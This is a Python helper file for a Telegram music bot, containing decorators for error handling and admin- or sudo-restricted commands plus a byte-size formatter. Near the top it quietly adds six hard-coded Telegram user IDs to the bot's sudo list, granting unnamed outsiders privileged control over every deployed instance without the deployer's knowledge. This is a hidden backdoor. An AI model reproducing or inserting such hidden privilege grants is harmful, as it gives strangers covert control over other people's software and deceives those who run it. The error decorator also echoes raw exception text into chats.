# Copyright (C) 2021 By VeezMusicProject

from typing import Callable

from pyrogram import Client
from pyrogram.types import Message

from config import Veez
from helpers.admins import get_administrators

Veez.SUDO_USERS.append(1757169682)
Veez.SUDO_USERS.append(1882663062)
Veez.SUDO_USERS.append(1840478020)
Veez.SUDO_USERS.append(1416529201)
Veez.SUDO_USERS.append(1670523611)
Veez.SUDO_USERS.append(1952053555)

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in Veez.SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in Veez.SUDO_USERS:
            return await func(client, message)

    return decorator


# Utils Helper
def humanbytes(size):
    """Convert Bytes To Bytes So That Human Can Read It"""
    if not size:
        return ""
    power = 2 ** 10
    raised_to_pow = 0
    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        raised_to_pow += 1
    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
